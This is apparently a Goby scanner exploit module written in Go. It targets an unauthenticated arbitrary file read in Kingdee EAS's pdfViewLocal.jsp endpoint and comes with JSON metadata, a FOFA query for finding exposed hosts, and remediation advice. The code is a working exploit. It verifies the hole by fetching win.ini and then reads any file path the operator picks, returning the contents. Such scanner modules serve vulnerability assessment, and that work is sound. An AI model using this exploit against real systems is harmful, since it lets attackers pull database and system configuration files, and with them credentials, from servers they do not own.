package exploits

import (
  "errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Kingdee-EAS /pdfViewLocal.jsp File Read Vulnerability",
    "Description": "<p>Kingdee EAS provides a digital platform with comprehensive functions, stable performance and strong scalability for group enterprises, helping enterprises link the upstream and downstream of the external industrial chain, realize information sharing and risk sharing, optimize the allocation of resources in the ecosystem, build a moat of the industrial ecology, and at the same time open up the data chain of the internal value chain of the enterprise, so as to achieve no data landing and no breakpoint in management, support the integrated coordination of \"horizontal to edge\" financial business and the integrated management and control of the \"vertical to the end\" group strategy, and help enterprises strengthen their core competitiveness.  </p><p>There is an arbitrary file reading vulnerability in the Kingdee EAS pdfviewlocal interface, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.</p>",
    "Product": "Kingdee-EAS",
    "Homepage": "http://www.kingdee.com/",
    "DisclosureDate": "2024-01-12",
    "PostTime": "2024-08-12",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/eassso\" && title=\"EAS\"",
    "GobyQuery": "body=\"/eassso\" && title=\"EAS\"",
    "Level": "1",
    "Impact": "<p>Kingdee EAS pdfviewlocal interface at the existence of arbitrary file reading vulnerability, unauthenticated attackers can be read through the vulnerability of important system files (such as database configuration files, system configuration files), database configuration files, and so on, resulting in the site in an extremely insecure state.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/YUUKI4O4/POC/blob/bc32409e8ca83c470e16d03aedfa3c2ad08250bc/%E9%87%91%E8%9D%B6/Kingdee_EAS_pdfviewlocal_arbitrary_file_read_vulnerability/README.md?plain=1#L13"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "C:/Windows/System32/drivers/etc/hosts",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "金蝶EAS /pdfViewLocal.jsp 文件读取漏洞",
            "Product": "Kingdee-EAS",
            "Description": "<p>金蝶EAS 为集团型企业提供功能全面、性能稳定、扩展性强的数字化平台，帮助企业链接外部产业链上下游，实现信息共享、风险共担，优化生态圈资源配置，构筑产业生态的护城河，同时打通企业内部价值链的数据链条，实现数据不落地，管理无断点，支撑“横向到边”财务业务的一体化协同和“纵向到底”集团战略的一体化管控，帮助企业强化核心竞争力。&nbsp;&nbsp;<br></p><p>金蝶EAS pdfviewlocal接口处存在任意文件读取漏洞，未经身份验证的攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。&nbsp;&nbsp;<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>金蝶EAS pdfviewlocal接口处存在任意文件读取漏洞，未经身份验证的攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。&nbsp;&nbsp;<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Kingdee-EAS /pdfViewLocal.jsp File Read Vulnerability",
            "Product": "Kingdee-EAS",
            "Description": "<p>Kingdee EAS provides a digital platform with comprehensive functions, stable performance and strong scalability for group enterprises, helping enterprises link the upstream and downstream of the external industrial chain, realize information sharing and risk sharing, optimize the allocation of resources in the ecosystem, build a moat of the industrial ecology, and at the same time open up the data chain of the internal value chain of the enterprise, so as to achieve no data landing and no breakpoint in management, support the integrated coordination of \"horizontal to edge\" financial business and the integrated management and control of the \"vertical to the end\" group strategy, and help enterprises strengthen their core competitiveness.&nbsp;&nbsp;</p><p>There is an arbitrary file reading vulnerability in the Kingdee EAS pdfviewlocal interface, through which an unauthenticated attacker can read important system files (such as database configuration files, system configuration files, database configuration files, etc.), resulting in extremely insecure websites.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Kingdee EAS pdfviewlocal interface at the existence of arbitrary file reading vulnerability, unauthenticated attackers can be read through the vulnerability of important system files (such as database configuration files, system configuration files), database configuration files, and so on, resulting in the site in an extremely insecure state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9933"
}`
	postOrGet_svnuisdvnu3h2nu3hf4b2yfby2 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/plt_document/fragments/content/pdfViewLocal.jsp?path="+fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/plt_document/fragments/content/pdfViewLocal.jsp"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"c:/windows/win.ini": "[mci extensions]",
			}
			// 函数继承
			uploadFileFunc := postOrGet_svnuisdvnu3h2nu3hf4b2yfby2

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"c:/windows/win.ini", "[mci extensions]"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_svnuisdvnu3h2nu3hf4b2yfby2
			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}
			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
